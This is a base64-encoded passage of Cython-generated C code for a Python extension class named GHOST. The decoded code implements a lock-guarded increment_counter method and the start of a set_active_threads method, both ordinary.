KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgNjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDA6IGJyZWFrO1xuICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgICAgfVxuICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJncztcbiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJpbmNyZW1lbnRfY291bnRlciIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgNjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDI7IGkrKykge1xuICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImluY3JlbWVudF9jb3VudGVyIiwgMSwgMiwgMiwgaSk7IF9fUFlYX0VSUigwLCA2NywgX19weXhfTDNfZXJyb3IpIH1cbiAgICAgIH1cbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDIpKSB7XG4gICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgIH0gZWxzZSB7XG4gICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCA2NywgX19weXhfTDNfZXJyb3IpXG4gICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCA2NywgX19weXhfTDNfZXJyb3IpXG4gICAgfVxuICAgIF9fcHl4X3Zfc2VsZiA9IHZhbHVlc1swXTtcbiAgICBfX3B5eF92X2tleSA9IHZhbHVlc1sxXTtcbiAgfVxuICBnb3RvIF9fcHl4X0w2X3NraXA7XG4gIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjtcbiAgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImluY3JlbWVudF9jb3VudGVyIiwgMSwgMiwgMiwgX19weXhfbmFyZ3MpOyBfX1BZWF9FUlIoMCwgNjcsIF9fcHl4X0wzX2Vycm9yKVxuICBfX3B5eF9MNl9za2lwOjtcbiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTtcbiAgX19weXhfTDNfZXJyb3I6O1xuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QuaW5jcmVtZW50X2NvdW50ZXIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBOVUxMO1xuICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7XG4gIF9fcHl4X3IgPSBfX3B5eF9wZl8ydHRfNUdIT1NUXzJpbmNyZW1lbnRfY291bnRlcihfX3B5eF9zZWxmLCBfX3B5eF92X3NlbGYsIF9fcHl4X3Zfa2V5KTtcblxuICBcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnR0XzVHSE9TVF8yaW5jcmVtZW50X2NvdW50ZXIoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfa2V5KSB7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF82O1xuICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzkgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xMCA9IE5VTEw7XG4gIGludCBfX3B5eF90XzExO1xuICBpbnQgX19weXhfdF8xMjtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiaW5jcmVtZW50X2NvdW50ZXIiLCAwKTtcblxuICBcbiAgIHtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2xvY2spOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA2OCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9leGl0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNjgsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgIF9fcHl4X3RfNCA9IE5VTEw7XG4gICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lbnRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDY4LCBfX3B5eF9MM19lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICBfX3B5eF90XzYgPSAxO1xuICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICBpZiAobGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNSkpKSB7XG4gICAgICBfX3B5eF90XzQgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpO1xuICAgICAgYXNzZXJ0KF9fcHl4X3RfNCk7XG4gICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNSk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzUsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX3B5eF90XzYgPSAwO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICB7XG4gICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBOVUxMfTtcbiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgxLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA2OCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgICB9XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgIHtcbiAgICAgIHtcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfNywgJl9fcHl4X3RfOCwgJl9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgICB7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NvdW50ZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA2OSwgX19weXhfTDdfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3Zfa2V5KTtcbiAgICAgICAgICBfX3B5eF90XzMgPSBfX3B5eF92X2tleTtcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0w3X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5TG9uZ19BZGRPYmpDKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEsIDEsIDEsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA2OSwgX19weXhfTDdfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KChQeU9iamVjdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfdF8zLCBfX3B5eF90XzQpIDwgMCkpKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0w3X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuXG4gICAgICAgICAgXG4gICAgICAgIH1cbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgICAgZ290byBfX3B5eF9MMTJfdHJ5X2VuZDtcbiAgICAgICAgX19weXhfTDdfZXJyb3I6O1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICB7XG4gICAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC5pbmNyZW1lbnRfY291bnRlciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMSwgJl9fcHl4X3RfMywgJl9fcHl4X3RfNCkgPCAwKSBfX1BZWF9FUlIoMCwgNjgsIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICBfX3B5eF90XzUgPSBQeVR1cGxlX1BhY2soMywgX19weXhfdF8xLCBfX3B5eF90XzMsIF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDY4LCBfX3B5eF9MOV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8yLCBfX3B5eF90XzUsIE5VTEwpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCA2OCwgX19weXhfTDlfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMTApO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgICAgaWYgKF9fcHl4X3RfMTEgPCAoMCkpIF9fUFlYX0VSUigwLCA2OCwgX19weXhfTDlfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fcHl4X3RfMTIgPSAoIV9fcHl4X3RfMTEpO1xuICAgICAgICAgIGlmICh1bmxpa2VseShfX3B5eF90XzEyKSkge1xuICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzEpO1xuICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzMpO1xuICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF80KTtcbiAgICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmVXaXRoU3RhdGUoX19weXhfdF8xLCBfX3B5eF90XzMsIF9fcHl4X3RfNCk7XG4gICAgICAgICAgICBfX3B5eF90XzEgPSAwOyAgX19weXhfdF8zID0gMDsgIF9fcHl4X3RfNCA9IDA7IFxuICAgICAgICAgICAgX19QWVhfRVJSKDAsIDY4LCBfX3B5eF9MOV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIGdvdG8gX19weXhfTDhfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfTDlfZXhjZXB0X2Vycm9yOjtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF85KTtcbiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzgsIF9fcHl4X3RfOSk7XG4gICAgICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgICAgIF9fcHl4X0w4X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF85KTtcbiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzgsIF9fcHl4X3RfOSk7XG4gICAgICAgIF9fcHl4X0wxMl90cnlfZW5kOjtcbiAgICAgIH1cbiAgICB9XG4gICAgIHtcbiAgICAgIHtcbiAgICAgICAgaWYgKF9fcHl4X3RfMikge1xuICAgICAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSwgTlVMTCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgNjgsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgICB9XG4gICAgICAgIGdvdG8gX19weXhfTDY7XG4gICAgICB9XG4gICAgICBfX3B5eF9MNjo7XG4gICAgfVxuICAgIGdvdG8gX19weXhfTDE2O1xuICAgIF9fcHl4X0wzX2Vycm9yOjtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0wxNjo7XG4gIH1cblxuICBcblxuICBcbiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTtcbiAgZ290byBfX3B5eF9MMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QuaW5jcmVtZW50X2NvdW50ZXIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19weXhfciA9IE5VTEw7XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ydHRfNUdIT1NUXzVzZXRfYWN0aXZlX3RocmVhZHMoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbik7IFxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMnR0XzVHSE9TVF81c2V0X2FjdGl2ZV90aHJlYWRzID0geyJzZXRfYWN0aXZlX3RocmVhZHMiLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJ0dF81R0hPU1RfNXNldF9hY3RpdmVfdGhyZWFkcywgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnR0XzVHSE9TVF81c2V0X2FjdGl2ZV90aHJlYWRzKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pIHtcbiAgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiA9IDA7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2NvdW50ID0gMDtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gICNlbmRpZlxuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0KiB2YWx1ZXNbMl0gPSB7MCwwfTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJzZXRfYWN0aXZlX3RocmVhZHMgKHdyYXBwZXIpIiwgMCk7XG4gICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTtcbiAgI2Vsc2VcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDtcbiAgI2VuZGlmXG4gICNlbmRpZlxuICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTtcbiAge1xuICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlbGYsJl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb3VudCwwfTtcbiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDtcbiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MM19lcnJvcilcbiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7XG4gICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7XG4gICAgICAgIGNhc2UgIDI6XG4gICAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMV0pKSBfX1BZWF9FUlIoMCwgNzEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDE6XG4gICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgNzEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDA6IGJyZWFrO1xuICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgICAgfVxuICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJncztcbiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJzZXRfYWN0aXZlX3RocmVhZHMiLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAyOyBpKyspIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJzZXRfYWN0aXZlX3RocmVhZHMiLCAxLCAyLCAyLCBpKTsgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MM19lcnJvcikgfVxuICAgICAgfVxuICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMikpIHtcbiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgfSBlbHNlIHtcbiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzFdKSkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MM19lcnJvcilcbiAgICB9XG4gICAgX19weXhfdl9zZWxmI